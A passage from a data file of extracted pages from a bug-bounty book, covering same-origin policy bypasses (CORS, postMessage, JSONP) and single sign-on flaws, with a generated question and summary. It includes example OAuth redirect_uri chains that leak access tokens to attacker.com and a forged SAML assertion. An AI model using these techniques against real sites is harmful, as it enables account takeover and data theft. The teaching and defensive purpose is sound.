Access-Control-Allow-Origin header only if that origin\nis in the allowlist. For public information, the server can simply use the wild-\ncard * designation for Access-Control-Allow-Origin.\nExploiting postMessage()\nSome sites work around SOP by using postMessage(). This method is a web\nAPI that uses JavaScript syntax. You can use it to send text-based messages\nto another window:\nRECIPIENT_WINDOW.postMessage(MESSAGE_TO_SEND, TARGET_ORIGIN);\nThe receiving window would then handle the message by using an\nevent handler that will be triggered when the receiving window receives a\nmessage:\nwindow.addEventListener(\"message\",EVENT_HANDLER_FUNCTION);\nSince using postMessage() requires the sender to obtain a reference to the\nreceiver’s window, messages can be sent only between a window and its iframes\nor pop-ups. That’s because only windows that open each other will have a way\nto reference each other. For example, a window can use window.open to refer to\na new window it opened. Alternatively, it can use window.opener to reference the\n298 Chapter 19\nwindow that spawned the current window. It can use window.frames to reference\nembedded iframes, and window.parent to reference the parent window of the\ncurrent iframe.\nFor example, say we’re trying to pass the following JSON blob located at\na.example.com/user_info to b.example.com:\n{'username': 'vickieli', 'account_number': '12345'}\na.example.com can open b.example.com and send a message to its window.\nThe window.open() function opens the window of a particular URL and\nreturns a reference to it:\nvar recipient_window = window.open(\"https://b.example.com\", b_domain)\nrecipient_window.postMessage(\"{'username': 'vickieli', 'account_number': '12345'}\", \"*\");\nAt the same time, b.example.com would set up an event listener to process\nthe data it receives:\nfunction parse_data(event) {\n// Parse the data\n}\nwindow.addEventListener(\"message\", parse_data);\nAs you can see, postMessage() does not bypass SOP directly but provides\na way for pages of different origins to send data to each other.\nThe postMessage() method can be a reliable way to implement cross-\norigin communication. However, when using it, both the sender and\nthe receiver of the message should verify the origin of the other side.\nVulnerabilities happen when pages enforce weak origin checks or lack\norigin checks altogether.\nFirst, the postMessage() method allows the sender to specify the receiver’s\norigin as a parameter. If the sender page doesn’t specify a target origin and\nuses a wildcard target origin instead, it becomes possible to leak informa-\ntion to other sites:\nRECIPIENT_WINDOW.postMessage(MESSAGE_TO_SEND, *);\nIn this case, an attacker can create a malicious HTML page that listens\nfor events coming from the sender page. They can then trick users into trig-\ngering the postMessage() by using a malicious link or fake image and make\nthe victim page send data to the attacker’s page.\nTo prevent this issue, developers should always set the TARGET_ORIGIN\nparameter to the target site’s URL instead of using a wildcard origin:\nrecipient_window.postMessage(\n\"{'username': 'vickieli', 'account_number': '12345'}\", \"https://b.example.com\");\nOn the other hand, if the message receiver doesn’t validate the page\nwhere the postMessage() is coming from, it becomes possible for attackers to\nSame-Origin Policy Vulnerabilities 299\nsend arbitrary data to the website and trigger unwanted actions on the vic-\ntim’s behalf. For example, let’s say that b.example.com allows a.example.com to\ntrigger a password change based on a postMessage(), like this:\nrecipient_window.postMessage(\n\"{'action': 'password_change', 'username': 'vickieli', 'new_password': 'password'}\",\n\"https://b.example.com\");\nThe page b.example.com would then receive the message and process the\nrequest:\nfunction parse_data(event) {\n// If \"action\" is \"password_change\", change the user's password\n}\nwindow.addEventListener(\"message\", parse_data);\nNotice here that any window can send messages to b.example.com, so any\npage can initiate a password change on b.example.com! To exploit this behav-\nior, the attacker can embed or open the victim page to obtain its window\nreference. Then they’re free to send arbitrary messages to that window.\nTo prevent this issue, pages should verify the origin of the sender of a\nmessage before processing it:\nfunction parse_data(event) {\n1 if (event.origin == \"https://a.example.com\"){\n// If \"action\" is \"password_change\", change the user's password\n}\n}\nwindow.addEventListener(\"message\", parse_data);\nThis line 1 verifies the origin of the sender by checking it against an\nacceptable origin.\nExploiting JSON with Padding\nJSON with Padding (JSONP) is another technique that works around the SOP.\nIt allows the sender to send JSON data as JavaScript code. A page of a differ-\nent origin can read the JSON data by processing the JavaScript.\nTo see how this works, let’s continue with our previous example, where\nwe’re trying to pass the following JSON blob located at a.example.com/user\n_info to b.example.com:\n{\"username\": \"vickieli\", \"account_number\": \"12345\"}\nThe SOP allows the HTML <script> tag to load scripts across origins,\nso an easy way for b.example.com to retrieve data across origins is to load the\ndata as a script in a <script> tag:\n<script src=\"https://a.example.com/user_info\"></script>\n300 Chapter 19\nThis way, b.example.com would essentially be including the JSON data\nblock in a script tag. But this would cause a syntax error because JSON data\nis not valid JavaScript:\n<script>\n{\"username\": \"vickieli\", \"account_number\": \"12345\"}\n</script>\nJSONP works around this issue by wrapping the data in a JavaScript\nfunction, and sending the data as JavaScript code instead of a JSON file.\nThe requesting page includes the resource as a script and specifies a\ncallback function, typically in a URL parameter named callback or jsonp.\nThis callback function is a predefined function on the receiving page ready\nto process the data:\n<script src=\"https://a.example.com/user_info?callback=parseinfo\"></script>\nThe page at a.example.com will return the data wrapped in the specified\ncallback function:\nparseinfo({\"username\": \"vickieli\", \"account_number\": \"12345\"})\nThe receiving page would essentially be including this script, which is\nvalid JavaScript code:\n<script>\nparseinfo({\"username\": \"vickieli\", \"account_number\": \"12345\"})\n</script>\nThe receiving page can then extract the data by running the JavaScript\ncode and processing the parseinfo() function. By sending data as scripts\ninstead of JSON data, JSONP allows resources to be read across origins.\nHere’s a summary of what happens during a JSONP workflow:\n1. The data requestor includes the data’s URL in a script tag, along with\nthe name of a callback function.\n2. The data provider returns the JSON data wrapped within the specified\ncallback function.\n3. The data requestor receives the function and processes the data by run-\nning the returned JavaScript code.\nYou can usually find out if a site uses JSONP by looking for script tags\nthat include URLs with the terms jsonp or callback.\nBut JSONP comes with risks. When JSONP is enabled on an endpoint,\nan attacker can simply embed the same script tag on their site and request\nthe data wrapped in the JSONP payload, like this:\n<script src=\"https://a.example.com/user_info?callback=parseinfo\"></script>\nSame-Origin Policy Vulnerabilities 301\nIf a user is browsing the attacker’s site while logged into a.example.com\nat the same time, the user’s browser will include their credentials in this\nrequest and allow attackers to extract confidential data belonging to the\nvictim.\nThis is why JSONP is suitable for transmitting only public data. While\nJSONP can be hardened by using CSRF tokens or maintaining an allow-\nlist of referer headers for JSONP requests, these protections can often be\nbypassed.\nAnother issue with JSONP is that site b.example.com would have to trust\nsite a.example.com completely, because it’s running arbitrary JavaScript\nfrom a.example.com. If a.example.com is compromised, the attacker could run\nwhatever JavaScript they wanted on b.example.com, because b.example.com is\nincluding the file from a.example.com in a <script> tag. This is equivalent to\nan XSS attack.\nNow that CORS is a reliable option for cross-origin communication,\nsites no longer use JSONP as often.\nBypassing SOP by Using XSS\nFinally, XSS is essentially a full SOP bypass, because any JavaScript that runs\non a page operates under the security context of that page. If an attacker\ncan get a malicious script executed on the victim page, the script can access\nthe victim page’s resources and data. Therefore, remember that if you can\nfind an XSS, you’ve essentially bypassed the SOP protecting that page.\nHunting for SOP Bypasses\nLet’s start hunting for SOP bypass vulnerabilities by using what you’ve\nlearned! SOP bypass vulnerabilities are caused by the faulty implementa-\ntion of SOP relaxation techniques. So the first thing you need to do is to\ndetermine whether the target application relaxes the SOP in any way.\nStep 1: Determine If SOP Relaxation Techniques Are Used\nYou can determine whether the target is using an SOP-relaxation technique\nby looking for the signatures of each SOP-relaxation technique. When you’re\nbrowsing a web application, open your proxy and look for any signs of cross-\norigin communication. For example, CORS sites will often return HTTP\nresponses that contain an Access-Control-Allow-Origin header. A site could be\nusing postMessage() if you inspect a page (for example, by right-clicking it in\nChrome and choosing Inspect, then navigating to Event Listeners) and find\na message event listener (Figure 19-1).\nAnd a site could be using JSONP if you see a URL being loaded in a\n<script> tag with a callback function:\n<script src=\"https://a.example.com/user_info?callback=parseinfo\"></script>\n<script src=\"https://a.example.com/user_info?jsonp=parseinfo\"></script>\n302 Chapter 19\nIf you see clues of cross-origin communication, try the techniques men-\ntioned in this chapter to see if you can bypass the SOP and steal sensitive\ninfo from the site!\nFigure 19-1: Finding the event listeners of a page in the Chrome browser\nStep 2: Find CORS Misconfiguration\nIf the site is using CORS, check whether the Access-Control-Allow-Origin\nresponse header is set to null.\nOrigin: null\nSame-Origin Policy Vulnerabilities 303\nIf not, send a request to the site with the origin header attacker.com, and\nsee if the Access-Control-Allow-Origin in the response is set to attacker.com.\n(You can add an Origin header by intercepting the request and editing it in\na proxy.)\nOrigin: attacker.com\nFinally, test whether the site properly validates the origin URL by sub-\nmitting an Origin header that contains an allowed site, such as www.example\n.com.attacker.com. See if the Access-Control-Allow-Origin header returns the\norigin of the attacker’s domain.\nOrigin: www.example.com.attacker.com\nIf one of these Access-Control-Allow-Origin header values is returned,\nyou have found a CORS misconfiguration. Attackers will be able to bypass\nthe SOP and smuggle information offsite (Figure 19-2).\nDoes the site return\nDoes the site use CORS? Yes Access-Control-Allow\n-Origin: NULL?\nYes\nYes\nDoes the site return\nAccess-Control-Allow\n-Origin: attacker.com Yes CORS misconfiguration\nif you send a request with\nOrigin: attacker.com?\nNo\nDoes the site return\nAccess-Control-Allow\n-Origin: if you send a Yes\nrequest with Origin:\nwww.example.com.attacker.com?\nFigure 19-2: Is the site vulnerable to a CORS misconfiguration\nvulnerability?\nStep 3: Find postMessage Bugs\nIf the site is using postMessage, see if you can send or receive messages as\nan untrusted site. Create an HTML page with an iframe that frames the\ntargeted page accepting messages. Try to send messages to that page that\n304 Chapter 19\ntrigger a state-changing behavior. If the target cannot be framed, open it as\na new window instead:\nvar recipient_window = window.open(\"https://TARGET_URL\", target_domain)\nrecipient_window.postMessage(\"RANDOM MESSAGE\", \"*\");\nYou can also create an HTML page that listens for events coming from\nthe target page, and trigger the postMessage from the target site. See if you\ncan receive sensitive data from the target page.\nvar sender_window = window.open(\"https://TARGET_URL\", target_domain)\nfunction parse_data(event) {\n// Run some code if we receive data from the target\n}\nwindow.addEventListener(\"message\", parse_data);\nStep 4: Find JSONP Issues\nFinally, if the site is using JSONP, see if you can embed a script tag on your\nsite and request the sensitive data wrapped in the JSONP payload:\n<script src=\"https://TARGET_URL?callback=parseinfo\"></script>\nStep 5: Consider Mitigating Factors\nWhen the target site does not rely on cookies for authentication, these SOP\nbypass misconfigurations might not be exploitable. For instance, when the site\nuses custom headers or secret request parameters to authenticate requests,\nyou might need to find a way to forge those to exfiltrate sensitive data.\nEscalating the Attack\nAn SOP-bypass bug often means that attackers can read private informa-\ntion or execute action as other users. This means that these vulnerabilities\nare often of high severity before any escalation attempts. But you can still\nescalate SOP-bypass issues by automation or by pivoting the attack using the\ninformation you’ve found. Can you harvest large amounts of user data by\nautomating the exploitation of the SOP bypass? Can you use the informa-\ntion you’ve found to cause more damage? For example, if you can extract\nthe security questions of a victim, can you use that information to com-\npletely take over the user’s account?\nMany researchers will simply report CORS misconfigurations without\nshowing the impact of the vulnerability. Consider the impact of the issue\nbefore sending the report. For instance, if a publicly readable page is served\nwith a null Access-Control-Allow-Origin header, it would not cause damage\nSame-Origin Policy Vulnerabilities 305\nto the application since that page does not contain any sensitive info. A\ngood SOP-bypass report will include potential attack scenarios and indicate\nhow attackers can exploit the vulnerability. For instance, what data can the\nattacker steal, and how easy would it be?\nFinding Your First SOP Bypass Vulnerability!\nGo ahead and start looking for your first SOP bypass. To find SOP-bypass\nvulnerabilities, you will need to understand the SOP relaxation techniques\nthe target is using. You may also want to become familiar with JavaScript in\norder to craft effective POCs.\n1. Find out if the application uses any SOP relaxation techniques. Is the\napplication using CORS, postMessage, or JSONP?\n2. If the site is using CORS, test the strength of the CORS allowlist by sub-\nmitting test Origin headers.\n3. If the site is using postMessage, see if you can send or receive messages as\nan untrusted site.\n4. If the site is using JSONP, try to embed a script tag on your site and\nrequest the sensitive data wrapped in the JSONP payload.\n5. Determine the sensitivity of the information you can steal using the vul-\nnerability, and see if you can do something more.\n6. Submit your bug report to the program!\n306 Chapter 19",
    "question": "What are the common ways that websites relax the same-origin policy and how can attackers exploit these relaxations to access private information or perform malicious actions?",
    "summary": "The same-origin policy (SOP) is a key security measure that restricts web scripts from accessing data from different origins. However, websites often relax SOP to allow more flexibility, which can lead to vulnerabilities if not properly configured. Attackers can exploit these relaxations through techniques like CORS misconfigurations, postMessage(), and JSONP to access private information or perform actions on behalf of users. Developers should ensure strict origin validation and proper configuration to prevent such exploits."
  },
  {
    "start": 214,
    "end": 223,
    "text": "20\nSINGLE-SIGN-ON\nSECURIT Y ISSUES\nSingle sign-on (SSO) is a feature that allows\nusers to access multiple services belonging\nto the same organization without logging\nin multiple times. Once you’ve logged into a\nwebsite that uses SSO, you won’t have to enter your\ncredentials again when accessing another service or\nresource belonging to the same company. For example, if you’re logged into\nfacebook.com, you won’t have to reenter your credentials to use messenger.com, a\nFacebook service.\nThis practice is convenient for companies with many web services,\nbecause they can manage a centralized source of user credentials instead\nof keeping track of a different set of users for each site. Users can save time\nas well, since they won’t need to log in multiple times when using the differ-\nent services provided by the same company. Since it makes things so much\neasier for both companies and users, SSO has become common practice on\nthe internet.\nBut new vulnerabilities that threaten SSO systems have also emerged.\nIn this chapter, we’ll talk about three methods developers use to implement\nSSO, as well as some vulnerabilities related to each approach.\nMechanisms\nCookie sharing, SAML, and OAuth are the three most common ways of\nimplementing SSO. Each mechanism has unique strengths and weaknesses,\nand developers choose different approaches depending on their needs.\nCooking Sharing\nThe implementation of SSO is quite easy if the services that need to share\nauthentication are located under the same parent domain, as is the case with\nthe web and mobile versions of Facebook at www.facebook.com and m.facebook\n.com. In these situations, applications can share cookies across subdomains.\nHow Cookie Sharing Works\nModern browsers allow sites to share their cookies across subdomains if the\ncookie’s Domain flag is set to a common parent domain. For example, if the\nserver sets a cookie like the following, the cookie will be sent to all sub-\ndomains of facebook.com:\nSet-Cookie: cookie=abc123; Domain=facebook.com; Secure; HttpOnly\nHowever, not all applications can use this approach, because cookies\ncan’t be shared this way across different domains. For instance, facebook.com\nand messenger.com can’t share cookies, because they don’t share a common\nparent domain.\nMoreover, this simple SSO setup comes with unique vulnerabilities. First,\nbecause the session cookie is shared across all subdomains, attackers can take\nover the accounts of all websites under the same parent domain by stealing a\nsingle cookie from the user. Usually, attackers can steal the session cookies by\nfinding a vulnerability like cross-site scripting.\nAnother common method used to compromise shared-session SSO is\nwith a subdomain takeover vulnerability.\nSubdomain Takeovers\nPut simply, subdomain takeovers occur when an attacker takes control over a\ncompany’s unused subdomain.\nLet’s say a company hosts its subdomain on a third-party service, such\nas AWS or GitHub Pages. The company can use a DNS CNAME record\nto point the subdomain to another URL on the third-party site. This way,\nwhenever users request the official subdomain, they’ll be redirected to the\nthird-party web page.\nFor example, say an organization wants to host its subdomain, abc.example\n.com, on the GitHub page abc_example.github.io. The organization can use a\n308 Chapter 20\nDNS CNAME record to point abc.example.com to abc_example.github.io so that\nusers who try to access abc.example.com will be redirected to the GitHub-\nhosted page.\nBut if this third-party site is deleted, the CNAME record that points\nfrom the company’s subdomain to that third-party site will remain unless\nsomeone remembers to remove it. We call these abandoned CNAME records\ndangling CNAMEs. Since the third-party page is now unclaimed, anyone who\nregisters that site on the third-party service can gain control of the company’s\nsubdomain.\nLet’s say the company in our example later decides to delete the GitHub\npage but forgets to remove the CNAME record pointing to abc_example\n.github.io. Because abc_example.github.io is now unclaimed, anyone can regis-\nter a GitHub account and create a GitHub page at abc_example.github.io. Since\nabc.example.com still points to abc_example.github.io, the owner of abc_example\n.github.io now has full control over abc.example.com.\nSubdomain takeovers allow attackers to launch sophisticated phishing\ncampaigns. Users sometimes check that the domain name of a page they’re\nvisiting is legit, and subdomain takeovers allow attackers to host malicious\npages using legitimate domain names. For example, the attacker who took\nover abc.example.com can host a page that looks like example.com on the GitHub\npage to trick users into providing their credentials.\nBut subdomain takeovers can become even more dangerous if the\norganization uses cookie sharing. Imagine that example.com implements a\nshared-session-based SSO system. Its cookies will be sent to any subdomain\nof example.com, including abc.example.com. Now the attacker who took over\nabc.example.com can host a malicious script there to steal session cookies.\nThey can trick users into accessing abc.example.com, maybe by hosting it as\na fake image or sending the link over to the user. As long as the victim has\nalready logged into example.com’s SSO system once, the victim’s browser will\nsend their cookie to the attacker’s site. The attacker can steal the victim’s\nshared session cookie and log in as the victim to all services that share the\nsame session cookie.\nIf the attacker can steal the shared session cookie by taking control of a\nsingle subdomain, all example.com sites will be at risk. Because the compro-\nmise of a single subdomain can mean a total compromise of the entire SSO\nsystem, using shared cookies as an SSO mechanism greatly widens the attack\nsurface for each service.\nSecurity Assertion Markup Language\nSecurity Assertion Markup Language (SAML) is an XML-based markup lan-\nguage used to facilitate SSO on larger-scale applications. SAML enables\nSSO by facilitating information exchange among three parties: the user,\nthe identity provider, and the service provider.\nHow SAML Works\nIn SAML systems, the user obtains an identity assertion from the identity\nprovider and uses that to authenticate to the service provider. The identity\nSingle-Sign-On Security Issues 309\nprovider is a server in charge of authenticating the user and passing on user\ninformation to the service provider. The service provider is the actual site that\nthe user intends to access.\nFigure 20-1 illustrates how the process works.\nUser Service Identity\nprovider provider\nTries to access resource\nRedirects to identity provider\nwith SAML request\nForwards SAML request\nAuthenticates user and sends\nSAML response\nSends SAML response\nUser is authenticated\nFigure 20-1: A simplified view of the SAML authentication process\nFirst, you try to access a resource from the service provider. Since you\naren’t logged in, the service provider makes you send a SAML request to\nthe identity provider. Once you’ve provided your credentials, the identity\nprovider will send you a SAML response, which you can use to authenticate\nto the service provider. The SAML response contains an identity assertion\nthat communicates your identity to the service provider. These are usually\nuniquely identifiable pieces of information such as your username, email\naddress, or user ID. For instance, take a look at the following SAML identity\nassertion. It communicates the user’s identity via the user’s username:\n<saml:AttributeStatement>\n<saml:Attribute Name=\"username\">\n<saml:AttributeValue>\nuser1\n</saml:AttributeValue>\n</saml:Attribute>\n</saml:AttributeStatement>\nNOTE All the SAML messages in this chapter are highly simplified for the sake of readability.\nRealistic SAML messages will be longer and contain a lot more information.\n310 Chapter 20\nSAML Vulnerabilities\nAs you can see in Figure 20-1, the key to accessing resources held by the\nservice provider is in the SAML response. An attacker who can control the\nSAML response passed to the service provider can authenticate as someone\nelse. Therefore, applications need to protect the integrity of their SAML mes-\nsages, which they usually accomplish by using a signature to sign the message.\nSAML can be secure if the SAML signature is implemented correctly.\nHowever, its security breaks apart if attackers can find a way to bypass the\nsignature validation and forge the identity assertion to assume the identity\nof others. For example, if the attacker can change the embedded username\nin a SAML assertion, they can log in as another user.\nThe digital signature that most applications apply to SAML messages\nensures that no one can tamper with them. If a SAML message has the\nwrong signature, it won’t be accepted:\n<saml:Signature>\n<saml:SignatureValue>\ndXNlcjE=\n</saml:SignatureValue>\n</saml:Signature>\n<saml:AttributeStatement>\n<saml:Attribute Name=\"username\">\n<saml:AttributeValue>\nuser1\n</saml:AttributeValue>\n</saml:Attribute>\n</saml:AttributeStatement>\nUnfortunately, SAML security mechanisms aren’t always well imple-\nmented. Sometimes the SAML signature isn’t implemented or verified at\nall! If this is the case, attackers can forge the identity information in the\nSAML response at will. Other times, developers make the mistake of verify-\ning signatures only if they exist. Attackers can then empty the signature\nfield or remove the field completely to bypass the security measure.\nLastly, if the signing mechanism used to generate the signature is weak\nor predictable, attackers can forge signatures. If you take a closer look at the\nprevious signed SAML message, you’ll notice that the signature, dXNlcjE=,\nis just the base64 encoding of user1. We can deduce that the signature\nmechanism used is base64(username). To forge a valid identity assertion for\nvictim_user, we can change the signature field to base64(\"victim_user\"), which\nis dmljdGltX3VzZXI=, and obtain a valid session as victim_user:\n<saml:Signature>\n<saml:SignatureValue>\ndmljdGltX3VzZXI=\n</saml:SignatureValue>\n</saml:Signature>\n<saml:AttributeStatement>\nSingle-Sign-On Security Issues 311\n<saml:Attribute Name=\"username\">\n<saml:AttributeValue>\nvictim_user\n</saml:AttributeValue>\n</saml:Attribute>\n</saml:AttributeStatement>\nAnother common mistake developers make is trusting that encryption\nalone will provide adequate security for the SAML messages. Encryption\nprotects a message’s confidentiality, not its integrity. If a SAML response\nis encrypted but not signed, or signed with a weak signature, attackers can\nattempt to tamper with the encrypted message to mess with the outcome of\nthe identity assertion.\nThere are many interesting ways of tampering with encrypted messages\nwithout having to break the encryption. The details of such techniques are\nbeyond the scope of this book, but I encourage you to look them up on the\ninternet. To learn more about encryption attacks, visit Wikipedia at https://\nen.wikipedia.org/wiki/Encryption#Attacks_and_countermeasures.\nSAML messages are also a common source of sensitive data leaks. If a\nSAML message contains sensitive user information, like passwords, and isn’t\nencrypted, an attacker who intercepts the victim’s traffic might be able to\nsteal those pieces of information.\nFinally, attackers can use SAML as a vector for smuggling malicious input\nonto the site. For example, if a field in a SAML message is passed into a data-\nbase, attackers might be able to pollute that field to achieve SQL injection.\nDepending on how the SAML message is used server-side, attackers might also\nbe able to perform XSS, XXE, and a whole host of other nasty web attacks.\nThese SAML vulnerabilities all stem from a failure to protect SAML\nmessages by using signatures and encryption. Applications should use\nstrong encryption and signature algorithms and protect their secret keys\nfrom theft. Additionally, sensitive user information such as passwords\nshouldn’t be transported in unencrypted SAML messages. Finally, as with\nall user input, SAML messages should be sanitized and checked for mali-\ncious user input before being used.\nOAuth\nThe final way of implementing SSO that we’ll discuss is OAuth. OAuth is\nessentially a way for users to grant scope-specific access tokens to service\nproviders through an identity provider. The identity provider manages cre-\ndentials and user information in a single place, and allows users to log in by\nsupplying service providers with information about the user’s identity.\nHow OAuth Works\nWhen you log in to an application using OAuth, the service provider requests\naccess to your information from the identity provider. These resources might\ninclude your email address, contacts, birthdate, and anything else it needs to\n312 Chapter 20\ndetermine who you are. These permissions and pieces of data are called the\nscope. The identity provider will then create a unique access_token that the\nservice provider can use to obtain the resources defined by the scope.\nLet’s break things down further. When you log in to the service provider\nvia OAuth, the first request that the service provider will send to the identity\nprovider is the request for an authorization. This request will include the ser-\nvice provider’s client_id used to identify the service provider, a redirect_uri\nused to redirect the authentication flow, a scope listing the requested permis-\nsions, and a state parameter, which is essentially a CSRF token:\nidentity.com/oauth?\nclient_id=CLIENT_ID\n&response_type=code\n&state=STATE\n&redirect_uri=https://example.com/callback\n&scope=email\nThen, the identity provider will ask the user to grant access to the ser-\nvice provider, typically via a pop-up window. Figure 20-2 shows the pop-up\nwindow that Facebook uses to ask for your consent to send information to\nspotify.com if you choose to log in to Spotify via Facebook.\nFigure 20-2: The consent pop-up seen during a\ntypical OAuth flow\nSingle-Sign-On Security Issues 313\nAfter the user agrees to the permissions the service provider asks for,\nthe identity provider will send the redirect_uri an authorization code:\nhttps://example.com/callback?authorization_code=abc123&state=STATE\nThe service provider can then obtain an access_token from the identity\nprovider by using the authorization code, along with their client ID and\nsecret. Client IDs and client secrets authenticate the service provider to the\nidentity provider:\nidentity.com/oauth/token?\nclient_id=CLIENT_ID\n&client_secret=CLIENT_SECRET\n&redirect_uri=https://example.com/callback\n&code=abc123\nThe identity provider will send back the access_token, which can be used\nto access the user’s information:\nhttps://example.com/callback?#access_token=xyz123\nA service provider might, for instance, initiate a request to the identity\nprovider for an access token to access the user’s email. Then it could use the\nemail retrieved from the identity provider as proof of the user’s identity to\nlog the user in to the account registered with the same email address.\nOAuth Vulnerabilities\nSometimes attackers can bypass OAuth authentication by stealing critical\nOAuth tokens through open redirects. Attackers do this by manipulating the\nredirect_uri parameter to steal the access_token from the victim’s account.\nThe redirect_uri determines where the identity provider sends critical\npieces of information like the access_token. Most major identity providers,\ntherefore, require service providers to specify an allowlist of URLs to use as\nthe redirect_uri. If the redirect_uri provided in a request isn’t on the allow-\nlist, the identity provider will reject the request. The following request, for\nexample, will be rejected if only example.com subdomains are allowed:\nclient_id=CLIENT_ID\n&response_type=code\n&state=STATE\n&redirect_uri=https://attacker.com\n&scope=email\nBut what if an open redirect vulnerability exists within one of the\nallowlisted redirect_uri URLs? Often, access_tokens are communicated via a\nURL fragment, which survives all cross-domain redirects. If an attacker can\nmake the OAuth flow redirect to the attacker’s domain in the end, they can\n314 Chapter 20\nsteal the access_token from the URL fragment and gain access to the user’s\naccount.\nOne way of redirecting the OAuth flow is through a URL-parameter-\nbased open redirect. For example, using the following URL as the\nredirect_uri\nredirect_uri=https://example.com/callback?next=attacker.com\nwill cause the flow to redirect to the callback URL first\nhttps://example.com/callback?next=attacker.com#access_token=xyz123\nand then to the attacker’s domain:\nhttps://attacker.com#access_token=xyz123\nThe attacker can send the victim a crafted URL that will initiate the\nOAuth flow, and then run a listener on their server to harvest the leaked\ntokens:\nidentity.com/oauth?\nclient_id=CLIENT_ID\n&response_type=code\n&state=STATE\n&redirect_uri=https://example.com/callback?next=attacker.com\n&scope=email\nAnother way of redirecting the OAuth flow is through a referer-based\nopen redirect. In this case, the attacker would have to set up the referer\nheader by initiating the OAuth flow from their domain:\n<a href=\"https://example.com/login_via_facebook\">Click here to log in to example.com</a>\nThis will cause the flow to redirect to the callback URL first:\nhttps://example.com/callback?#access_token=xyz123\nThen it would redirect to the attacker’s domain via the referer:\nhttps://attacker.com#access_token=xyz123\nEven when attackers can’t find an open redirect on the OAuth endpoint\nitself, they can still smuggle the tokens offsite if they can find an open redirect\nchain. For example, let’s say the redirect_uri parameter permits only further\nredirects to URLs that are under the example.com domain. If attackers can\nfind an open redirect within that domain, they can still steal OAuth tokens\nvia redirects. Let’s say an unfixed open redirect is on the logout endpoint of\nexample.com:\nhttps://example.com/logout?next=attacker.com\nSingle-Sign-On Security Issues 315\nBy taking advantage of this open redirect, the attacker can form a\nchain of redirects to eventually smuggle the token offsite, starting with the\nfollowing:\nredirect_uri=https://example.com/callback?next=example.com/logout?next=attacker.com\nThis redirect_uri will first cause the flow to redirect to the callback URL:\nhttps://example.com/callback?next=example.com/logout?next=attacker.com#access_token=xyz123\nThen to the logout URL vulnerable to open redirect:\nhttps://example.com/logout?next=attacker.com#access_token=xyz123\nThen it will redirect to the attacker’s domain. The attacker can harvest\nthe access token via their server logs, and access the user’s resources via the\nstolen token:\nhttps://attacker.com#access_token=xyz123\nBesides stealing access tokens via an open redirect, long-lived tokens\nthat don’t expire are also a major OAuth vulnerability. Sometimes tokens\naren’t invalidated periodically and can be used by attackers long after they\nare stolen, and remain valid even after password reset. You can test for these\nissues by using the same access tokens after logout and after password reset.\nHunting for Subdomain Takeovers\nLet’s start your hunt for SSO vulnerabilities by finding some subdomain\ntakeovers. The best way to reliably discover subdomain takeovers is to build a\nsystem that monitors a company’s subdomains for takeovers. But before you\ndo that, let’s look at how you can search for subdomain takeovers manually.\nStep 1: List the Target’s Subdomains\nFirst, you need to build a list of all the known subdomains of your target. This\ncan be done using tools mentioned in Chapter 5. Next, use a screenshot appli-\ncation like EyeWitness or Snapper to see what is hosted on each subdomain.\nStep 2: Find Unregistered Pages\nLook for third-party pages indicating that the page isn’t registered. For\nexample, if the third-party page is hosted on GitHub Pages, you should see\nsomething like Figure 20-3 on the subdomain.\nEven if you’ve found a dangling CNAME, not all third-party hosting\nproviders are vulnerable to takeovers. Some providers employ measures to\nverify the identity of users, to prevent people from registering pages associ-\nated with CNAME records. Currently, pages hosted on AWS, Bitbucket, and\nGitHub are vulnerable, whereas pages on Squarespace and Google Cloud\n316 Chapter 20\nare not. You can find a full list of which third-party sites are vulnerable\non EdOverflow’s page on the topic (https://github.com/EdOverflow/can-i-take\n-over-xyz/). You can find a list of page signatures that indicate an unregis-\ntered page there too.\nFigure 20-3: An indicator that this page hosted on GitHub Pages is unclaimed\nStep 3: Register the Page\nOnce you’ve determined that the page is vulnerable to takeovers, you\nshould try to register it on the third-party site to confirm the vulnerability.\nTo register a page, go to the third-party site and claim the page as yours;\nthe actual steps required vary by third-party provider. Host a harmless\nproof-of-concept page there to prove the subdomain takeover, such as a\nsimple HTML page like this one:\n<html>Subdomain Takeover by Vickie Li.</html>\nMake sure to keep the site registered until the company mitigates the\nvulnerability by either removing the dangling DNS CNAME or by reclaim-\ning the page on the third-party service. If you don’t, a malicious attacker\nmight be able to take over the subdomain while the bug report is being\nprocessed.\nYou might be able to steal cookies with the subdomain takeover if the\nsite uses cookie-sharing SSO. Look for cookies that can be sent to multiple\nsubdomains in the server’s responses. Shared cookies are sent with the Domain\nattribute specifying the parents of subdomains that can access the cookie:\nSet-Cookie: cookie=abc123; Domain=example.com; Secure; HttpOnly\nThen, you can log in to the legitimate site, and visit your site in the\nsame browser. You can monitor the logs of your newly registered site to\ndetermine whether your cookies were sent to it. If the logs of your newly\nSingle-Sign-On Security Issues 317\nregistered site receive your cookies, you have found a subdomain takeover\nthat can be used to steal cookies!\nEven if the subdomain takeover you’ve found cannot be used to steal\nshared-session cookies, it is still considered a vulnerability. Subdomain take-\novers can be used to launch phishing attacks on a site’s users, so you should\nstill report them to the organization!\nMonitoring for Subdomain Takeovers\nInstead of manually hunting for subdomain takeovers, many hackers build\na monitoring system to continuously scan for them. This is useful because\nsites update their DNS entries and remove pages from third-party sites all\nthe time. You never know when a site is going to be taken down and when a\nnew dangling CNAME will be introduced into your target’s assets. If these\nchanges lead to a subdomain takeover, you can find it before others do by\nroutinely scanning for takeovers.\nTo create a continuous monitoring system for subdomain takeovers,\nyou’ll simply need to automate the process I described for finding them\nmanually. In this section, I’ll introduce some automation strategies and\nleave the actual implementation up to you:\nCompile a list of subdomains that belong to the target organization\nScan the target for new subdomains once in a while to monitor for new\nsubdomains. Whenever you discover a new service, add it to this list of\nmonitored subdomains.\nScan for subdomains on the list with CNAME entries that point to pages\nhosted on a vulnerable third-party service\nTo do this, you’ll need to resolve the base DNS domain of the subdo-\nmain and determine if it’s hosted on a third-party provider based on\nkeywords in the URL. For example, a subdomain that points to a URL\nthat contains the string github.io is hosted on GitHub Pages. Also deter-\nmine whether the third-party services you’ve found are vulnerable to\ntakeovers. If the target’s sites are exclusively hosted on services that\naren’t vulnerable to subdomain takeovers, you don’t have to scan them\nfor potential takeovers.\nDetermine the signature of an unregistered page for each external service\nMost services will have a custom 404 Not Found page that indicates\nthe page isn’t registered. You can use these pages to detect a potential\ntakeover. For example, a page that is hosted on GitHub pages is vulner-\nable if the string There isn't a GitHub Pages site here is returned in the\nHTTP response. Make a request to the third-party hosted subdomains\nand scan the response for these signature strings. If one of the signa-\ntures is detected, the page might be vulnerable to takeover.\nOne way of making this hunting process even more efficient is to let\nyour automation solution run in the background, notifying you only after it\nfinds a suspected takeover. You can set up a cron job to run the script you’ve\n318 Chapter 